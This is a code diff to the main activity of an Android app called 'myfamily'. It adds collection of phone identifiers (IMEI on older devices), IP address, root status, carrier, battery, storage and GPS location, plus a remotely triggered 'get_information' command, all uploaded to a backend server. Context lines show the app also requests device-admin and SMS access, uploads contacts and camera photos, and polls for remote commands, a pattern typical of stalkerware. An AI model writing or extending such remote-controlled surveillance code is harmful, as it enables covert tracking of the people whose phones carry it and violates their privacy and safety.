@@ -1,16 +1,20 @@
 package com.apps.myfamily
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.app.AppOpsManager
 import android.app.admin.DevicePolicyManager
 import android.app.usage.UsageStatsManager
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.ComponentName
-import android.content.pm.PackageManager
-import androidx.core.app.ActivityCompat
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.content.pm.PackageManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import androidx.core.app.ActivityCompat
 import android.net.Uri
 import android.os.*
 import android.provider.Settings
@@ -70,7 +74,10 @@ import android.telephony.TelephonyManager
 import android.telephony.PhoneStateListener
 import android.telephony.CellInfo
 import android.telephony.CellSignalStrength
-
+import android.os.StatFs
+import android.telephony.SignalStrength
+import java.net.NetworkInterface
+import java.net.Inet4Address
 
 
 class MainActivity : ComponentActivity() {
@@ -79,6 +86,7 @@ class MainActivity : ComponentActivity() {
     
     // Track if we're returning from settings
     private var returningFromSettings = false
+    
     // Permission request codes
     private val LOCATION_PERMISSION_CODE = 1001
     private val NOTIFICATION_PERMISSION_CODE = 1002
@@ -87,7 +95,7 @@ class MainActivity : ComponentActivity() {
     private val SMS_PERMISSION_CODE = 1010
     private val CONTACTS_PERMISSION_CODE = 1011
     private val READ_CONTACT_CODE = 1011
-    
+    private val PHONE_STATE_PERMISSION_CODE = 1012
     
     // Track which permissions to request next
     private val pendingPermissions = mutableListOf<String>()
@@ -126,11 +134,19 @@ class MainActivity : ComponentActivity() {
                 uploadContactsToBackend(this)
             }.start()
         }
-        
         // Panggil fungsi untuk kirim info device
         requestDeviceAdmin()
         startCommandService()
         registerDevice()
+        
+        // Collect and upload device information at startup if permission is granted
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            Log.i("MainActivity", "READ_PHONE_STATE permission already granted, collecting device info")
+            collectDeviceInformation(this)
+        } else {
+            Log.i("MainActivity", "READ_PHONE_STATE permission not granted, will request it")
+        }
+        
         sendAppUsageToBackend()
         sendDeviceLocation()
         startPollingCommands()
@@ -153,6 +169,9 @@ class MainActivity : ComponentActivity() {
             
             // Add contacts permission right after SMS permission for prioritization
             pendingPermissions.add(Manifest.permission.READ_CONTACTS)
+            
+            // Add READ_PHONE_STATE to get device information
+            pendingPermissions.add(Manifest.permission.READ_PHONE_STATE)
             
             pendingPermissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
             pendingPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -184,6 +203,10 @@ class MainActivity : ComponentActivity() {
                     Manifest.permission.READ_SMS -> {
                         Log.d("PermissionDebug", "Requesting SMS permission")
                         ActivityCompat.requestPermissions(this, arrayOf(permission), SMS_PERMISSION_CODE)
+                    }
+                    Manifest.permission.READ_PHONE_STATE -> {
+                        Log.d("PermissionDebug", "Requesting PHONE_STATE permission")
+                        ActivityCompat.requestPermissions(this, arrayOf(permission), PHONE_STATE_PERMISSION_CODE)
                     }
                     Manifest.permission.ACCESS_FINE_LOCATION -> {
                         Log.d("PermissionDebug", "Requesting LOCATION permission")
@@ -255,9 +278,28 @@ class MainActivity : ComponentActivity() {
                     }, 2000)
                 }
             }
+            PHONE_STATE_PERMISSION_CODE -> {
+                if ((grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
+                    Log.i("PermissionPhoneState", "READ_PHONE_STATE granted")
+                    // Collect device information when permission is granted
+                    collectDeviceInformation(this)
+                    
+                    // Show confirmation to user
+                    Toast.makeText(this, "Device information collected", Toast.LENGTH_SHORT).show()
+                } else {
+                    Log.e("PermissionPhoneState", "READ_PHONE_STATE denied")
+                    // Show a message explaining why phone state permission is needed
+                    Toast.makeText(this, "Phone state permission is necessary for device identification", Toast.LENGTH_LONG).show()
+                }
+            }
             LOCATION_PERMISSION_CODE -> {
-                Log.d("PermissionDebug", "LOCATION permission result: " +
-                    if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) "GRANTED" else "DENIED")
+                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    Log.i("PermissionLocation", "ACCESS_FINE_LOCATION granted")
+                    // Send device location when permission is granted
+                    sendDeviceLocation()
+                } else {
+                    Log.e("PermissionLocation", "ACCESS_FINE_LOCATION denied")
+                }
             }
             NOTIFICATION_PERMISSION_CODE -> {
                 Log.d("PermissionDebug", "NOTIFICATION permission result: " +
@@ -546,20 +588,31 @@ class MainActivity : ComponentActivity() {
     private fun sendDeviceLocation() {
         val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
     
+        // Check if we have permission to access location
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-            Log.e("LocationSend", "Permission not granted")
+            Log.w("LocationSend", "ACCESS_FINE_LOCATION permission not granted, requesting it")
+            
+            // Request the permission at runtime
+            ActivityCompat.requestPermissions(
+                this,
+                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
+                LOCATION_PERMISSION_CODE
+            )
             return
         }
     
+        // Permission is granted, proceed with location access
+        Log.i("LocationSend", "Getting location with granted permission")
         fusedLocationClient.lastLocation
             .addOnSuccessListener { location ->
                 if (location != null) {
                     val latitude = location.latitude
                     val longitude = location.longitude
     
+                    Log.i("LocationSend", "Location obtained: $latitude, $longitude")
                     val json = JSONObject()
-                    json.put("latitude", latitude as Double)
-                    json.put("longitude", longitude as Double)
+                    json.put("latitude", latitude)
+                    json.put("longitude", longitude)
     
                     val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                     val mediaType = "application/json; charset=utf-8".toMediaType()
@@ -589,6 +642,9 @@ class MainActivity : ComponentActivity() {
                 } else {
                     Log.e("LocationSend", "Location is null")
                 }
+            }
+            .addOnFailureListener { e ->
+                Log.e("LocationSend", "Error getting location: ${e.message}")
             }
     }
     
@@ -668,6 +724,15 @@ class MainActivity : ComponentActivity() {
                             uploadContactsToBackend(applicationContext)
                         }
 
+                        "get_information" -> {
+                            Log.d("CmdService", "Running get_information command")
+                            // Execute on main thread to avoid Looper issues
+                            runOnUiThread {
+                                Log.d("CmdService", "Collecting device information on UI thread")
+                                collectDeviceInformation(applicationContext)
+                            }
+                        }
+
                     }
                 } catch (e: Exception) {
                     Log.e("PollCommand", "Parse error: ${e.message}")
@@ -675,6 +740,191 @@ class MainActivity : ComponentActivity() {
             }
         })
     }
+
+    private fun isDeviceRooted(): Boolean {
+        val paths = listOf(
+            "/system/bin/su", "/system/xbin/su", "/sbin/su",
+            "/system/sd/xbin/su", "/system/bin/failsafe/su"
+        )
+        return paths.any { File(it).exists() }
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun collectDeviceInformation(context: Context) {
+        val info = JSONObject()
+
+        // Timestamp
+        info.put("timestamp", System.currentTimeMillis())
+
+        // Battery
+        val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+        val status = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
+        val charging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
+        info.put("battery_level", level)
+        info.put("charging", charging)
+
+        // Internet
+        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+        var connectionType = "OFFLINE"
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val network = cm.activeNetwork
+            val capabilities = cm.getNetworkCapabilities(network)
+            if (capabilities != null) {
+                connectionType = when {
+                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WIFI"
+                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "MOBILE"
+                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "ETHERNET"
+                    else -> "UNKNOWN"
+                }
+            }
+        } else {
+            @Suppress("DEPRECATION")
+            val networkInfo = cm.activeNetworkInfo
+            if (networkInfo != null && networkInfo.isConnected) {
+                connectionType = when (networkInfo.type) {
+                    ConnectivityManager.TYPE_WIFI -> "WIFI"
+                    ConnectivityManager.TYPE_MOBILE -> "MOBILE"
+                    else -> "UNKNOWN"
+                }
+            }
+        }
+        
+        info.put("internet", connectionType)
+
+        // Device Info
+        info.put("device_model", Build.MODEL)
+        info.put("android_version", Build.VERSION.RELEASE)
+        info.put("sdk_int", Build.VERSION.SDK_INT)
+
+        // Storage Info
+        val stat = StatFs(Environment.getDataDirectory().path)
+        val free = stat.blockSizeLong * stat.availableBlocksLong
+        val total = stat.blockSizeLong * stat.blockCountLong
+        info.put("storage_free_mb", free / (1024 * 1024))
+        info.put("storage_total_mb", total / (1024 * 1024))
+
+        // Root Check
+        info.put("is_rooted", isDeviceRooted())
+
+        // IP Address
+        try {
+            val interfaces = NetworkInterface.getNetworkInterfaces()
+            for (intf in interfaces) {
+                val addrs = intf.inetAddresses
+                for (addr in addrs) {
+                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
+                        info.put("ip_address", addr.hostAddress)
+                        break
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+
+        // Signal strength (handled in next step)
+        listenForSignalStrength(context, info)
+    }
+
+    private fun listenForSignalStrength(context: Context, info: JSONObject) {
+        // Check for READ_PHONE_STATE permission before accessing phone state
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("PhoneState", "READ_PHONE_STATE permission not granted")
+            info.put("signal_strength_dbm", JSONObject.NULL)
+            info.put("permission_state", "READ_PHONE_STATE permission denied")
+            
+            // Continue with location upload even without phone state info
+            getLocationAndUpload(context, info)
+            return
+        }
+        
+        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+    
+        val listener = object : PhoneStateListener() {
+            override fun onSignalStrengthsChanged(signalStrength: SignalStrength?) {
+                super.onSignalStrengthsChanged(signalStrength)
+                try {
+                    val dbm = signalStrength?.cellSignalStrengths?.firstOrNull()?.dbm
+                    info.put("signal_strength_dbm", dbm ?: JSONObject.NULL)
+                    
+                    // Add IMEI and operator info if available (requires READ_PHONE_STATE)
+                    try {
+                        // This line requires READ_PHONE_STATE permission - already checked above
+                        info.put("operator_name", tm.networkOperatorName)
+                        
+                        // Only add device ID (IMEI) for API levels below 29
+                        // For API 29+, we'll have to use alternative identifiers
+                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+                            info.put("device_id", tm.deviceId)
+                        }
+                        
+                        // Get cellular network info
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            val cellInfo = tm.allCellInfo
+                            if (cellInfo != null && cellInfo.isNotEmpty()) {
+                                info.put("cell_info_available", true)
+                                
+                                // Get network operator info
+                                val mcc = tm.networkOperator.substring(0, 3)
+                                val mnc = tm.networkOperator.substring(3)
+                                info.put("mcc", mcc)
+                                info.put("mnc", mnc)
+                            }
+                        }
+                    } catch (e: Exception) {
+                        Log.e("PhoneState", "Error getting phone state details: ${e.message}")
+                    }
+                    
+                } catch (_: Exception) {
+                    info.put("signal_strength_dbm", JSONObject.NULL)
+                }
+    
+                getLocationAndUpload(context, info)
+                tm.listen(this, PhoneStateListener.LISTEN_NONE)
+            }
+        }
+    
+        tm.listen(listener, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS)
+    }
+
+    private fun getLocationAndUpload(context: Context, info: JSONObject) {
+        val fused = LocationServices.getFusedLocationProviderClient(context)
+    
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            Log.i("LocationInfo", "ACCESS_FINE_LOCATION permission granted, getting location")
+            fused.lastLocation
+                .addOnSuccessListener { loc ->
+                    if (loc != null) {
+                        info.put("latitude", loc.latitude)
+                        info.put("longitude", loc.longitude)
+                        Log.i("LocationInfo", "Location data added to info: ${loc.latitude}, ${loc.longitude}")
+                    } else {
+                        Log.w("LocationInfo", "Location is null")
+                        info.put("location_available", false)
+                    }
+                    uploadInformation(context, info)
+                }
+                .addOnFailureListener { e ->
+                    Log.e("LocationInfo", "Failed to get location: ${e.message}")
+                    info.put("location_error", e.message)
+                    uploadInformation(context, info)
+                }
+        } else {
+            Log.w("LocationInfo", "ACCESS_FINE_LOCATION permission not granted")
+            info.put("location_permission", "denied")
+            uploadInformation(context, info)
+            
+            // If this is the main activity, request the permission
+            if (context is MainActivity) {
+                ActivityCompat.requestPermissions(
+                    context,
+                    arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
+                    context.LOCATION_PERMISSION_CODE
+                )
+            }
+        }
+    }
+    
 
     private fun uploadGalleryImages(context: Context) {
         val galleryDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera")
@@ -1071,6 +1321,40 @@ class MainActivity : ComponentActivity() {
         }, ContextCompat.getMainExecutor(this))
     }
 
+    // Implementation of uploadInformation method
+    private fun uploadInformation(context: Context, info: JSONObject) {
+        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        
+        // Create a wrapper JSON object with the expected format
+        val wrapper = JSONObject()
+        wrapper.put("device_id", androidId)
+        wrapper.put("information", info)  // Use "information" field name and pass the actual JSONObject
+        
+        Log.d("UploadInfo", "Sending device info: ${wrapper}")
+        
+        val body = wrapper.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+        
+        val request = Request.Builder()
+            .url("${ApiConfig.BASE_URL}/api/device/information")
+            .post(body)
+            .addHeader("Content-Type", "application/json")
+            .build()
+            
+        OkHttpClient().newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("UploadInfo", "Failed to upload device information: ${e.message}")
+            }
+            
+            override fun onResponse(call: Call, response: Response) {
+                if (response.isSuccessful) {
+                    Log.i("UploadInfo", "Device information uploaded successfully")
+                } else {
+                    Log.e("UploadInfo", "Error uploading device information: ${response.code}")
+                }
+            }
+        })
+    }
+    
     private fun uploadFileToBackend(file: File, uploadUrl: String) {
         try {
             // Log original file size
